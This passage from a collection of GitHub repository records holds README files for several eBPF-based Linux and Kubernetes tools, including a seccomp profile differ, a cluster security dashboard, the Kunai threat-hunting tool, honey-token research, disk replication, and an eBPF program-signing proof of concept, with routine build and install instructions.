optional arguments:
  -h, --help        show this help message and exit
  -k, --kubernetes  Use Kubernetes to fetch container info.
  -d, --docker      Use Docker to fetch container info (default).
```

Example: 
```bash
sudo python seccomp_diff.py -d
```
## `seccomp-dump`
Disassemble and display the seccomp-bpf profiles applied to a given process or container. 

### Usage
```
usage: seccomp_dump.py [-h] [--dump] [--summary] [--list] [--allarch] [pid]

Inspect seccomp profiles for a given PID.

positional arguments:
  pid         PID of the process to inspect

optional arguments:
  -h, --help  show this help message and exit
  --dump      Dump the raw seccomp filters
  --summary   Display a summary of the seccomp filters
  --list      Display a list of pids with seccomp filters
  --allarch   Search for all syscalls across any architecture
```
Example: List processes with seccomp profiles
```bash
python seccomp_dump.py --list
```
Example Dump given process' seccomp profile
```bash
 sudo python seccomp_dump.py --dump 436762
l0000: 20 00 00 00000004        A = [4](ARCH)
l0001: 15 00 04 c000003e        IF ARCH != X86_64: 6(l0006)
l0002: 20 00 00 00000000        A = [0](SYSCALL)
l0003: 35 00 01 40000000        jlt #0x40000000, l5
l0004: 15 00 01 ffffffff        IF SYSCALL != 0xffffffff: KILL(l0006)
l0005: 06 00 00 7ffc0000        RETURN LOG
l0006: 06 00 00 00000000        RETURN KILL
``` 

## `web.py`
A web interface for seccomp-diff to visually diff system calls. Ideal for use
within a Kubernetes cluster. 



### Usage

Example run locally:
```bash
sudo pip install -r requirements.txt
sudo python web.py
```

Example Docker run:
```bash
docker run --rm -it \
  --pid=host --privileged \                            
  --cap-add=SYS_PTRACE \                                             
  --security-opt seccomp=unconfined -v /var/run/docker.sock:/var/run/docker.sock \
  -v /proc:/host/proc:ro -v /run/containerd/containerd.sock:/run/containerd/containerd.sock \
  antitree/seccomp-diff
```
If running on k3s, mount `/run/k3s/containerd/containerd.sock` instead of `/run/containerd/containerd.sock`.


Example helm chart:
```bash
helm install seccomp-diff charts/seccomp-diff
kubectl port-forward service/seccomp-diff 5000:5000
```

When running inside Kubernetes with the agent DaemonSet, set the `AGENT_ENDPOINTS`
environment variable on the web deployment to a comma-separated list of agent
service URLs (for example `http://seccomp-diff-agent.seccomp-diff.svc.cluster.local:8000`).
The web interface will query each agent for container details and seccomp
summaries.

If your environment uses a non-standard location for the containerd socket
(for example `/run/k3s/containerd/containerd.sock` on k3s), update the Helm
value `agent.containerdSocket` accordingly.  The agent will also try to guess
between the common containerd and k3s paths when no value is provided.

### New DaemonSet Architecture

`seccomp-diff` can now be deployed in two parts: a lightweight web interface and
an agent that runs as a DaemonSet on every node.  The agent collects container
information, communicates with containerd and extracts seccomp bytecode.  The
web service queries each agent over HTTP and aggregates the results so a single
instance can display seccomp information for the whole cluster.

To deploy the agent use the provided `agent-daemonset.yaml` and
`agent-service.yaml` templates.  The web deployment no longer requires host
privileges because all low level operations are handled by the agents.

Example k8s deployment
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: seccomp-diff
spec:
  replicas: 1
  selector:
    matchLabels:
      app: seccomp-diff
  template:
    metadata:
      labels:
        app: seccomp-diff
    spec:
      containers:
      - name: seccomp-diff
        image: antitree/seccomp-diff:latest
        env:
        - name: AGENT_ENDPOINTS
          value: ""http://seccomp-diff-agent.seccomp-diff.svc.cluster.local:8000""
        command: [""flask""]
        args: [""run"", ""--debug""]
```
---

## Current Limitations
* [ ] Only visually diffs x86_64 for now


## Related work

https://github.com/david942j/seccomp-tools - original powerful seccomp tool set written in Ruby that inspired this project
https://github.com/kleptog/PyBPF - module that does some of the heavy lifting of the BPF struct

## Thanks

- Jay Beale
- Mike Yamamoto
- Alex Page

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.

"
AdityaSeth777/ShieldK8s,18,1,18,0,TypeScript,"A privacy-focused, local-only security dashboard for monitoring Kubernetes cluster security using eBPF and Cilium. All metrics and data stay within your infrastructure.",2024-12-05T12:13:52Z,2025-08-04T11:35:17Z,34,"# Security Dashboard with eBPF

![Security Dashboard](./images/shieldk8s.jpg)

A privacy-focused, local-only security dashboard for monitoring Kubernetes cluster security using eBPF and Cilium. All metrics and data stay within your infrastructure.

## ðŸ”’ Privacy Features

- **Local-Only Monitoring**: All metrics and data remain within your infrastructure
- **No External Dependencies**: Monitoring stack runs entirely on your cluster
- **Zero Data Export**: No metrics or logs leave your environment
- **Self-Contained**: Similar architecture to Kafka + Grafana setups

## ðŸ›¡ï¸ Security Features

1. Network Security:
   - Layer 7 policy enforcement
   - Network encryption
   - Service mesh integration
   - Traffic monitoring

2. Threat Detection:
   - Anomaly detection
   - Behavioral analysis
   - Policy violation alerts
   - Real-time monitoring

3. Access Control:
   - RBAC integration
   - Policy enforcement
   - Audit logging
   - Authentication tracking

## Screenshots

![](./images/hp.png)
![](./images/db.png)

## ðŸš€ Quick Start

### Prerequisites

1. Kubernetes cluster (local or remote)
2. Helm 3.x
3. kubectl
4. Node.js 18+

### Backend Setup

1. Install Kind (Kubernetes in Docker):
```bash
# On Linux
curl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.20.0/kind-linux-amd64
chmod +x ./kind
sudo mv ./kind /usr/local/bin/kind

# Create cluster
kind create cluster --name security-cluster
```

2. Install Cilium:
```bash
# Add Helm repository
helm repo add cilium https://helm.cilium.io/
helm repo update

# Install Cilium
helm install cilium cilium/cilium --namespace kube-system \
  --set hubble.relay.enabled=true \
  --set hubble.ui.enabled=true \
  --set monitoring.enabled=true

# Enable Hubble
cilium hubble enable
```

3. Install Prometheus Stack:
```bash
# Add Helm repository
helm repo add prometheus-community https://prometheus-community.github.io/helm-charts
helm repo update

# Install Prometheus
helm install prometheus prometheus-community/kube-prometheus-stack \
  --namespace monitoring \
  --create-namespace
```

### Frontend Setup

1. Clone and install dependencies:
```bash
git clone https://github.com/AdityaSeth777/ShieldK8s
cd ShieldK8s
npm install
```

2. Configure environment variables:
```bash
cp .env.example .env
```

Edit `.env` with your configuration:
```env
VITE_SUPABASE_URL=your-project-url
VITE_SUPABASE_ANON_KEY=your-anon-key
```

3. Start the development server:
```bash
npm run dev
```

## ðŸ“Š Monitoring Features

### 1. Security Metrics
- CPU and Memory usage
- Network traffic analysis
- Pod security status
- Policy compliance

### 2. Network Monitoring
- Real-time connection tracking
- Traffic visualization
- Policy violations
- Protocol analysis

### 3. Alert System
- Real-time security alerts
- Severity classification
- Custom alert rules
- Notification system

## ðŸ”§ Configuration

### Network Policies

Apply basic network policies:

```bash
kubectl apply -f k8s/policies/default-deny.yaml
kubectl apply -f k8s/policies/allowed-namespaces.yaml
```

### Monitoring Setup

1. Access Prometheus:
```bash
kubectl port-forward svc/prometheus-server 9090:9090 -n monitoring
```

2. Access Grafana:
```bash
kubectl port-forward svc/grafana 3000:3000 -n monitoring
```

Default Grafana credentials:
- Username: admin
- Password: prom-operator

### Hubble UI

Access Hubble UI:
```bash
kubectl port-forward svc/hubble-ui 12000:80 -n kube-system
```


## ðŸ“ Development

### Project Structure

```
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ components/     # React components
â”‚   â”œâ”€â”€ hooks/         # Custom React hooks
â”‚   â”œâ”€â”€ pages/         # Page components
â”‚   â”œâ”€â”€ store/         # State management
â”‚   â”œâ”€â”€ types/         # TypeScript types
â”‚   â””â”€â”€ utils/         # Utility functions
â”œâ”€â”€ k8s/              # Kubernetes manifests
â”‚   â””â”€â”€ policies/     # Network policies
â””â”€â”€ api/             # Backend API
```

### Adding New Features

1. Create new components in `src/components/`
2. Add routes in `src/App.tsx`
3. Update types in `src/types/`
4. Add network policies in `k8s/policies/`

## ðŸ“š Documentation

Comprehensive documentation is available at `/docs` in the application, covering:

- Kubernetes setup
- Cilium & eBPF configuration
- Monitoring setup
- CLI tools
- Security policies
- Troubleshooting

## Blogs

[![https://adityaseth777.hashnode.dev/nlp-sheldon](./images/logo-resized.png)](https://adityaseth777.hashnode.dev/shieldK8s)

## ðŸ¤ Contributing

1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## ðŸ“„ License

[MIT](./LICENSE)

## What next?

I will be improving this project.

## Where to contact ?

Contact: [contact@adityaseth.in](mailto:contact@adityaseth.in?subject=Email%20owing%20to%20adityaseth.in&body=Greetings%2C%0AI%20am%20%5Bname%5D.%20I%20just%20came%20across%20your%20website%20and%20was%20hoping%20to%20talk%20to%20you%20about%20something.)

## ðŸ™‹â€â™‚ï¸ Support

ðŸ’™ If you like this project, give it a â­ and share it with friends! <br><br>

[<img width=""200"" height=""70"" src=""https://i.postimg.cc/R0cqPmDf/bmc-button.png"" alt=""buymeacoffee"">](https://www.buymeacoffee.com/adityaseth)

---
"
kunai-project/kunai,984,70,984,10,Rust,Threat-hunting tool for Linux,2023-06-21T14:02:18Z,2025-10-07T19:05:10Z,615,"<div align=""center""><img src=""assets/logo.svg"" width=""500""/></div>

[![CI](https://img.shields.io/github/actions/workflow/status/0xrawsec/kunai/ci.yml?style=for-the-badge)](https://github.com/0xrawsec/kunai/actions/workflows/ci.yml)
[![Downloads](https://img.shields.io/github/downloads/0xrawsec/kunai/total.svg?style=for-the-badge)]()
[![Discord](https://img.shields.io/badge/Discord-chat-5865F2?style=for-the-badge&logo=discord)](https://discord.com/invite/AUMaBvHvNU)

[![GitHub release (with filter)](https://img.shields.io/github/v/release/0xrawsec/kunai?style=for-the-badge&label=stable&color=green)](https://github.com/0xrawsec/kunai/releases/latest)
[![Documentation](https://img.shields.io/badge/docs-stable-blue.svg?style=for-the-badge&logo=docsdotrs)](https://why.kunai.rocks)

<!--
[![GitHub Latest Release](https://img.shields.io/github/v/release/kunai-project/kunai?include_prereleases&style=for-the-badge&label=unstable
)](https://github.com/kunai-project/kunai/releases)
[![Documentation](https://img.shields.io/badge/docs-unstable-orange.svg?style=for-the-badge&logo=docsdotrs)](https://why.kunai.rocks/docs/next/quickstart)
-->

# Leitmotiv

Kunai is a powerful tool designed to bring actionable insights for tasks such as **security monitoring** and **threat hunting** on **Linux** systems. Think of it as the Linux counterpart to Sysmon on Windows, tailored for comprehensive and precise event monitoring.

## Why Kunai Stands Out

- **Chronologically Ordered Events:** Events are processed and delivered in the exact order they occur.
- **On-Host Correlation:** Built-in capabilities for event enrichment and correlation to provide deeper context.
- **Container-Aware:** Fully compatible with Linux namespaces and container technologies, enabling complete tracing of container activities.

## How It Works

Kunai leverages eBPF (Extended Berkeley Packet Filter) technology, with kernel-level probes that capture critical events. These probes send data to a userland program, responsible for tasks like reordering, enriching, and correlating the collected events.

On the implementation side, Kunai is predominantly written in Rust, using the robust [Aya library](https://github.com/aya-rs/aya). This design ensures a self-contained standalone binary, embedding both the eBPF probes and the userland processing logic for ease of deployment.

# FAQ

* **Is it compatible with my OS/Kernel ?** : Check out [the compatibility page](https://why.kunai.rocks/docs/compatibility)
* **What kind of events can IÂ get ?** : Please take a read to [events documentation](https://why.kunai.rocks/docs/events/)
* **Which version should IÂ use ?**: If it is just to test the tool, use the latest build as it is always the best in terms of features and bug fix. However keep in mind that events in **non stable** releases **are subject to change**.

# How to Build the Project?

Before proceeding, please note that a distribution-agnostic, pre-compiled version of Kunai is available on the [release page](https://github.com/kunai-project/kunai/releases/latest). If you simply want to try Kunai, you likely donâ€™t need to build the project yourself.

## With a Docker image

You can use a Docker image that includes everything needed to build the project easily: [Kunai build docker image](https://github.com/kunai-project/kunai-build-docker/).  
This one-size-fits-all solution should work on any Linux distribution.

## Doing everything by hand

### Requirements

Before being able to build everything, you need to install a couple of tools.

* to build many Rust projects (this one included), you need [`rustup`](https://www.rust-lang.org/tools/install)
* to build kunai you need: `clang`, `libbpf-dev` and [`bpf-linker`](https://github.com/aya-rs/bpf-linker)

Example of commands to install requirements on Ubuntu/Debian:

```bash
sudo apt update
sudo apt install -y clang libbpf-dev

# assuming you have rustup and cargo installed
cargo install bpf-linker
```

### Building Kunai

Once you have the **requirements** installed, you are good to go. You can now build the project with **xtask**, a cargo command (specific to this project) to make your life easier.

Building debug version
```bash
cargo xtask build
# find your executable in:Â ./target/x86_64-unknown-linux-musl/debug/kunai
```

Building release version (harder, better, faster, stronger)
```bash
cargo xtask build --release
# find your executable in: ./target/x86_64-unknown-linux-musl/release/kunai
```

### Cross-compiling

#### aarch64

1. Install the proper target using rustup `rustup install target aarch64-unknown-linux-gnu`
2. You need to install appropriate compiler and linker to cross-compile
```bash
# example on ubuntu
sudo apt install gcc-aarch64-linux-gnu
```
4. Cross-compile the project
```bash
# compile the project for with release profile
CC=aarch64-linux-gnu-gcc  cargo xbuild --release --target aarch64-unknown-linux-gnu --linker aarch64-linux-gnu-gcc
```
4. You should find your cross-compiled binary at `./target/aarch64-unknown-linux-gnu/release/kunai`

**NB:** specifying `--linker` option is just a shortcut for setting appropriate RUSTFLAGS env variable when building userland
application.

# Memory Profiling

If one believes Kunai has an issue with memory, here is a way to profile it.

```bash
# compile kunai with debug information for all packages
RUSTFLAGS=""-g"" cargo xbuild

# use heaptrack
sudo heaptrack kunai
```

# Related Work

Sysmon For Linux:Â https://github.com/Sysinternals/SysmonForLinux

# Acknowledgements

* Thanks to all the people behind [Aya](https://github.com/aya-rs), this stuff is just awesome
* Special thanks to [@alessandrod](https://github.com/alessandrod) and [@vadorovsky](https://github.com/vadorovsky)
* Thanks to all the usual guys always supporting my crazy ideas

# Funding

The NGSOTI project is dedicated to training the next generation of Security Operation Center (SOC) operators, focusing on the human aspect of cybersecurity.
It underscores the significance of providing SOC operators with the necessary skills and open-source tools to address challenges such as detection engineering, 
incident response, and threat intelligence analysis. Involving key partners such as CIRCL, Restena, Tenzir, and the University of Luxembourg, the project aims
to establish a real operational infrastructure for practical training. This initiative integrates academic curricula with industry insights, 
offering hands-on experience in cyber ranges.

NGSOTI is co-funded under Digital Europe Programme (DEP) via the ECCC (European cybersecurity competence network and competence centre).
"
acassen/fastswan,32,1,32,0,C,Linux Kernel XFRM offload via eBPF/XDP,2025-01-13T08:46:53Z,2025-10-05T15:15:15Z,24,"# fastSwan: XFRM offload via XDP

<img width=""40%"" src=""https://www.fastswan.org/assets/logo-bg.png"" align=""left""/>
is a routing software written in C. The main goal of this project is to provide a fast data-path for the Linux Kernel XFRM layer. Some NIC vendors offer IPSEC acceleration via a Crypto mode or a Packet mode. In Packet mode, all IPSEC ESP operations are done by the hardware to offload the kernel for crypto and packet handling. To further increase perfs we implement kernel routing offload via XDP. A XFRM kernel netlink reflector is dynamically and transparently mirroring kernel XFRM policies to the XDP layer for kernel netstack bypass. fastSwan is an XFRM offload feature.

fastSwan is free software; you can redistribute it and/or modify it under the terms of the GNU Affero General Public License Version 3.0 as published by the Free Software Foundation.

---

IPsec is natively supported by the Linux Kernel via its XFRM layer. This feature is widely used in broadband and mobile network infrastructures. strongSwan software has become the de facto standard for running IPsec on Linux systems. Thanks to the efforts and long-term support of the strongSwan team, it has also become a reference cornerstone for interoperability. In this context, fastSwan is a side companion of strongSwan for its data-path which makes extensive use of eBPF/XDP. Netlink broadcast channel with the Linux Kernel is used to mirror XFRM policies to eBPF program. This eBPF program is loaded at the XDP layer and is routing/forwarding traffic directly at the netdevice ingress. Kernel XFRM is then offloaded and forwarding is done directly in the context of the netdevice driver. fastSwan only handles traffic for XFRM policies using HW offload.
<p align=""center""><img src=""https://www.fastswan.org/assets/global.png""></p>

"
patrickpichler/beesting,7,0,7,0,C,,2024-10-14T06:41:52Z,2025-02-12T17:50:35Z,7,"# beesting

Research project to better understand how to inject and monitor honey tokens into a kubernetes
workload, with minimal configurations.

You can find the individual research directions by looking at the `poc-vx` branches.

## PoCv1

This PoC focused on injecting the honey token via a OCI hook that runs on container creation.

For the hooks to be registered with the container runtime, the NRI (node resource interface)
is used. NRI appears to be a standardized way supported by containerD, as well as CRI-O (and
probably others, this still needs to be evaluated) of hooking into the creation of containers
and modifying them before creation. Kinda like a modifying admission web hook, but instead of
Kubernetes API level, it is on container runtime level.

The agent embedded a second hook binary, that gets unpacked on startup. This hook binary then
writes the honey token at a specified location inside the container.

More details can be found [here](https://github.com/patrickpichler/beesting/blob/poc-v1/ARCHITECTURE.md).

### Pros
* Restarts of the nodes should not matter here, as the container filesystem gets restored
* Very flexible, as the hook can setup anything in the container it wants

### Cons
* Requries a `hostPath` volume, which does allow executions

## PoCv2

This PoC mounts a token file into the container via a bind mount. To achieve this, once again
NRI was used to modify the container before it is send to the low level runtime.

More details can be found [here](https://github.com/patrickpichler/beesting/blob/poc-v2/ARCHITECTURE.md).

### Pros
* `hostPath` does not need to allow executions

### Cons
* Restarts of the nodes will cause the token file to be lost, as it is a bind mount into the container

## PoCv3

Based on PoCv2, when the token file is mounted into the container, the inode is retrieved and added
to eBPF map for monitoring. There is an eBPF program that attaches a kprobe to the `security_file_open`
function, which tests if the inode of the opened file is in the map of watched inodes. For the PoC
this is good enough, but additional security function would need to be hooked to also catch creating
of symlinks.

If a file open for a monitored inode is detected, a message to an ringbuffer is send. The sent event
contains the timestamp when the event was recorded, the process identity (which is PID, as well as
start time), the cgroup_id and the accessed inode. In userspace this event is then parsed and
transformed to an alert to the user.

To also be able to monitor existing containers, the `Synchronize` NRI hook is used, which will pass
all already existing containers. Beesting then watches the inodes of the corresponding container
token files.

More details can be found [here](https://github.com/patrickpichler/beesting/blob/poc-v3/ARCHITECTURE.md).

### Pro
* Easy to get inodes to watch since all of them are also accessible from the beesting pod

### Cons
* Restarts of the nodes will cause token files to be lost
"
xmigrate/blxrep,32,2,32,0,C,eBPF based sector level disk replication tool for disaster recovery purpose,2025-01-16T18:02:43Z,2025-10-01T17:11:06Z,32,"<p align=""center"">
  <img src=""assets/logo.svg"" alt=""blxrep logo"" width=""400""/>
</p>

# blxrep

blxrep is a powerful tool designed for live data replication of disks over a network. It operates in two modes: dispatcher and agent, allowing for efficient and flexible disaster recovery setup.
blxrep tracks the changes that happen on disk at sector level using eBPF tracepoints.

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
  - [Starting blxrep](#starting-blxrep)
  - [Dispatcher Commands](#dispatcher-commands)
- [Modes of Operation](#modes-of-operation)
- [TUI mode](#tui-mode)

## Overview

Traditionally, companies have relied on kernel modules for change block tracking and bitmap-based incremental backups. While functional, this approach has several limitations:

1. Complex kernel module development and maintenance requiring deep kernel expertise
2. Challenging debugging process due to kernel space operations
3. Limited testing capabilities in kernel space
4. Scalability constraints due to kernel-level implementation
5. Steep learning curve for kernel module development
6. System reboots required for kernel module loading and updates
7. Potential for system instability and security vulnerabilities due to unrestricted kernel access

blxrep modernizes this approach by leveraging eBPF tracepoints to track disk changes at the sector level. This brings several advantages:

1. Simplified development through eBPF's modern tooling, extensive documentation, and active community support
2. Enhanced debugging capabilities with user-space tools and eBPF maps
3. Comprehensive testing framework support
4. Better scalability through efficient event processing
5. More approachable learning curve with high-level eBPF programming interfaces
6. Dynamic loading without system reboots
7. Improved safety through eBPF's verifier and sandboxed execution environment

## Installation

### For Debian/Ubuntu based systems (.deb)

1. Download the package:
```bash
wget https://github.com/xmigrate/blxrep/releases/download/v0.1.0/blxrep-0.1.0-amd64.deb
```
2. Install the package:
```bash
sudo dpkg -i blxrep-0.1.0-amd64.deb
```
> Note: If you get an error about missing dependencies, you can install them with:
```bash
sudo apt-get install -f
```

### For Redhat/CentOS based systems (.rpm)

1. Download the package:
```bash
wget https://github.com/xmigrate/blxrep/releases/download/v0.1.0/blxrep-0.1.0-x86_64.rpm
```
2. Install the package:
```bash
sudo rpm -i blxrep-0.1.0-x86_64.rpm
```

## Verify the installation:
```bash
sudo blxrep --help
```

Configuration file is located at `/etc/blxrep/config.yaml` by default.
Policy directory is located at `/etc/blxrep/policies` by default.

## Policy Configuration

Default Policy configuration is located at `/etc/blxrep/policies/default.yaml` by default.
```yaml
name: ""default-backup-policy"" # name of the policy
description: ""Backup policy for all servers"" # description of the policy
archive_interval: 48h # archive interval
snapshot_frequency: ""daily"" # snapshot frequency
snapshot_time: ""12:00"" # snapshot time
bandwidth_limit: 100 # bandwidth limit
snapshot_retention: 30 # snapshot retention
live_sync_frequency: 2m # live sync frequency
transition_after_days: 30 # transition after days
delete_after_days: 90 # delete after days

targets:
  # Range pattern
  - pattern: ""*"" # pattern of the targets which is mentioned on agent /etc/blxrep/config.yaml
    disks_excluded: 
      - ""/dev/xvda"" # disks excluded from the policy
```
You can create your own policy by creating a new yaml file in the `/etc/blxrep/policies` directory.

## Post Installation
After installation, enable and start the blxrep service:

```bash
sudo systemctl enable blxrep
sudo systemctl start blxrep
```

After starting the blxrep service, you can see the status of the blxrep service with the following command:

```bash
sudo systemctl status blxrep
```


## Uninstallation

To uninstall blxrep, use the following command:

For Debian/Ubuntu:
```bash
sudo dpkg -r blxrep
```

For Redhat/CentOS:
```bash
sudo rpm -e blxrep
```

## Configuration

blxrep uses a configuration file located at `/etc/blxrep/config.yaml` by default. You can specify a different configuration file using the `--config` flag.

Example configuration for agent:

```yaml
mode: ""agent""
id: ""hostname""
dispatcher-addr: ""localhost:8080""
data-dir: ""/data""
```

Example configuration for dispatcher:

```yaml
mode: ""dispatcher""
data-dir: ""/data""
policy-dir: ""/etc/blxrep/policies""
```

## Usage

### Starting blxrep

To start blxrep, use the `start` command:

```bash
blxrep start [flags]
```

Flags:
| Flag | Description | Required For |
|------|-------------|--------------|
| `--mode` | Start mode ('dispatcher' or 'agent') | Both |
| `--id` | Agent ID | Agent mode |
| `--dispatcher-addr` | Dispatcher address (format: host:port) | Agent mode |
| `--data-dir` | Data directory | Dispatcher mode |
| `--policy-dir` | Policy directory | Dispatcher mode |
| `--config` | Configuration file | Optional |


## Modes of Operation

### Dispatcher Mode

In dispatcher mode, blxrep manages the overall replication process. It acts as a central collector for replicating disk data from multiple servers. It requires a data directory and policy directory to be specified. All types of disk backups are collected and stored in the specified data directory. Policy directory is used to specify the policy for the disk backups for each agent.


### Agent Mode

In agent mode, blxrep runs on individual servers to send snapshot backups and live changes to the dispatcher. It requires an agent ID, dispatcher address, and device to be specified. We need the agent ID to be unique if we are connecting multiple servers to the same dispatcher. Device is the disk that needs to be backed up and monitored for live changes.

### TUI mode

blxrep uses tcell for the TUI. It is a terminal UI library for Go that is easy to use and highly customizable. It is used to interact with the dispatcher and agents. With TUI mode, you can navigate throught the agegnts that are connected to the dispatcher and see the status of the disk backups. You can also mount the disk backups to any available point in time and restore the files or partitions with the help of the TUI.

To start the TUI, use the `tui` command:

```bash
blxrep tui --data-dir=<data_directory>
```
"
congwang/ebpf-2-phase-signing,12,2,12,0,C,,2025-01-27T00:39:57Z,2025-09-25T07:31:03Z,33,"# eBPF Two-Phase Signing System

This project implements a two-phase signing system for eBPF programs using PKCS#7 signatures. The system provides enhanced security by requiring two separate signatures: a 1st signature for the original program itself, and a 2nd signature that covers both the modified program and its original signature.

> **âš ï¸ WARNING âš ï¸**  
> **This only provides a proof of concept and is NOT suitable for production use!**


## Background and Design

### The Challenge with eBPF Program Signing

Traditional code signing approaches don't work well with eBPF programs due to their unique loading process. Here's why:

1. **Post-Compilation Modifications**:
   - When you compile an eBPF program, the resulting binary isn't in its final form
   - The libbpf library must modify this binary before it can run in the kernel
   - These modifications include:
     - Patching relocations
     - Updating map file descriptors
     - Other runtime adjustments

2. **Traditional Signing Problem**:
   - If you simply signed the original binary
   - The signature would become invalid after libbpf's necessary modifications
   - This makes traditional single-signature approaches ineffective

### Two-Phase Signing Solution

This project introduces a two-phase signing approach that mirrors the eBPF program preparation and loading process:

#### Phase 1: Baseline Signature
- Generated when the eBPF program is initially compiled
- Signs the original, unmodified program
- Serves as proof that the original program came from a trusted source
- Similar to getting a document notarized before filling in the blanks

#### Phase 2: Modified Program Signature
- Takes place after libbpf has made its necessary modifications
- Creates a signature covering:
  - The modified program
  - The original signature from Phase 1
- Establishes a chain of trust
- Proves modifications were authorized and applied to legitimate code

### Verification Process

When loading an eBPF program, the kernel performs verification in sequence:

1. **Original Program Verification**:
   - Verifies the original program against its baseline signature
   - Establishes that we started with trusted code

2. **Modified Program Verification**:
   - Verifies the secondary signature
   - Confirms that modifications were authorized
   - Ensures no unauthorized tampering occurred

### Benefits of This Approach

1. **No Kernel Changes Required**:
   - Built entirely on top of existing eBPF infrastructure
   - Leverages standard BPF LSM hooks for verification
   - Works with existing kernel security mechanisms
   - No need to modify core kernel code

2. **Practical Security**:
   - Maintains security while accommodating necessary program modifications
   - Similar to legal documents with initial notarization and subsequent verification

3. **Strong Auditability**:
   - If verification fails, you can pinpoint the exact stage of failure
   - Helps distinguish between:
     - Compromised original program
     - Unauthorized post-compilation modifications

4. **Chain of Trust**:
   - Each phase builds upon the previous one
   - Creates a verifiable link between original and modified code
   - Prevents signature stripping attacks

## Overview

### Components

1. **sign-ebpf.c**: The core eBPF LSM (Linux Security Module) program that verifies eBPF program signatures during loading
2. **bpf-loader.c**: The loader for sign-ebpf.o eBPF program
3. **program-loader.c**: User-space program that loads and signs eBPF programs
4. **minimal.bpf.c**: A minimal sample eBPF program for testing

## How It Works

The implementation follows the two-phase signing process:

1. **1st Signature Generation**:
   - The original eBPF program binary is signed using PKCS#7
   - This happens before any libbpf modifications
   - Establishes the program's original trusted state

2. **2nd Signature Generation**:
   - After libbpf processes the program (relocations, map FDs, etc.)
   - The modified program and original signature are combined
   - This combined data is signed with PKCS#7
   - Proves the modifications were authorized

3. **Runtime Verification**:
   - Uses BPF LSM hooks to intercept eBPF program loading
   - First the kernel verifies the original signature against the unmodified program data
   - Then the kernel verifies the second signature against the combined data
   - Program loading proceeds only if both verifications succeed
   - Failures provide detailed diagnostics about which phase failed

## Prerequisites

- Linux kernel 5.15 or later with eBPF and LSM support
- libbpf development files
- OpenSSL development files
- clang and llvm for BPF compilation

Install dependencies on Ubuntu/Debian:
```bash
sudo apt-get install libbpf-dev libssl-dev clang llvm
```

## Building

1. Clone the repository:
```bash
git clone https://github.com/congwang/ebpf-2-phase-signing.git
cd ebpf-2-phase-signing
```

2. Build the project:
```bash
make all
```

This will generate:
- `sign-ebpf.o`: The compiled eBPF LSM program
- `bpf-loader`: The helper program for loading the `sign-ebpf.o` eBPF program
- `program-loader`: The user-space loader program for signing and loading eBPF programs
- `minimal.bpf.o`: The minimal sample eBPF program for testing
- `add_key`: A helper program for adding keys to the keyring

## Usage

### 1. Generate Keys and Certificates

First, generate a key pair and self-signed certificate for signing:

```bash
make keys
```

### 2. Add Keys to the Keyring

Add the private key and certificate to the system keyrings:
```bash
sudo ./add_key keys/cert.der
```

### 3. Load the Signing Verification Program

Load the eBPF LSM program that performs signature verification:

```bash
sudo ./bpf-loader sign-ebpf.o
```

### 4. Sign and Load an eBPF Program

Use the program loader to sign and load your eBPF program:

```bash
# Sign and load the minimal program for testing
sudo ./program-loader minimal.bpf.o keys/private.key keys/cert.pem minimal_prog
```

### 5. Verify Operation

You should see the verification result from the output of the program loader.
If any failure, check the kernel logs to see the verification results:

```bash
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

## Security Considerations

1. **Key Management**:
   - Keep private keys secure and separate from production systems
   - Use proper certificate management practices
   - Consider using a hardware security module (HSM) for key storage

### Verification Process Details

The verification happens in multiple steps:

1. **Program Loading Interception**:
   - LSM hook intercepts BPF program loading
   - Checks for required signatures

2. **Original Signature Verification**:
   ```c
   ret = bpf_verify_pkcs7_signature(&orig_data_ptr, &orig_sig_ptr, trusted_keyring);
   if (ret) {
       // Original signature verification failed
       goto out;
   }
   ```

3. **Combined Data Verification**:
   ```c
   ret = bpf_verify_pkcs7_signature(&combined_data_ptr, &sig_ptr, trusted_keyring);
   if (ret) {
       // Modified signature verification failed
       goto out;
   }
   ```

4. **Buffer Validation**:
   - All memory operations use `bpf_dynptr` for safety
   - Strict bounds checking on all buffers
   - Size limitations enforced by verifier

## Debugging

Enable verbose output for detailed verification information:
```bash
sudo ./program-loader -v minimal.bpf.o keys/private.key keys/cert.pem minimal_prog
```

The system provides detailed error reporting through BPF prints:
- Copy failures
- Buffer size violations
- Signature verification failures

View these messages using:
```bash
sudo cat /sys/kernel/debug/tracing/trace_pipe
```

### Common Issues and Debugging

1. **Signature Size Issues**:
   - Ensure signatures don't exceed `MAX_SIG_SIZE` (4KB)
   - Check OpenSSL configuration for signature size

2. **Buffer Space Errors**:
   - Monitor total size of program + signature
   - Check debug output for size violations

3. **Keyring Access**:
   - Verify correct keyring permissions
   - Check keyring serial numbers in debug output

4. **Verification Failures**:
   - Enable verbose logging with `-v` flag
   - Check certificate validity and trust chain
   - Verify signature format and encoding

## Contributing

1. Fork the repository
2. Create a feature branch
3. Commit your changes
4. Push to the branch
5. Create a Pull Request

## License

This project is licensed under the GPL License - see the LICENSE file for details.
"
parttimenerd/concurrency-fuzz-scheduler,29,2,29,0,Java,Custom Linux scheduler for concurrency fuzzing written in Java with hello-ebpf,2025-01-24T15:13:02Z,2025-09-14T07:57:28Z,9,"Concurrency Fuzz Scheduler
===========

__Disclaimer: This is a proof of concept and highly experimental. Use at your own risk.__

A scheduler that creates random scheduling edge cases and is written in Java using [hello-ebpf](https://github.com/parttimenerd/hello-ebpf).

This is the code for the FOSDEM'25 talk [Concurrency Testing using Custom Linux Schedulers](https://fosdem.org/2025/schedule/event/fosdem-2025-4489-concurrency-testing-using-custom-linux-schedulers/):

> Consider you want to have a concurrency bug that requires threads to run in a specific order.
> Wouldn't it be great if you could stop and start threads at random? Prevent them from being
> scheduled onto the CPU? And the best part: Without the application being able to prevent this,
> like it could do with POSIX STOP and START signals? In come the scheduler extensions for the Linux Kernel.
> Introduced in version 6.12, they allow you to quickly write your own schedulers with eBPF,
> and can be the base for simple libraries that enable you to start and stop threads directly in the Linux kernel.
> This opens the possibility of creating complex scheduler scenarios at a whim.
>
> In this talk, we'll show you a prototypical sched_ext-based library for concurrency testing.

If you want to learn even more on the general concepts, I can recommend reading the excellent [LWN article](https://lwn.net/SubscriberLink/1007689/922423e440f5e68a/).

## Usage

```
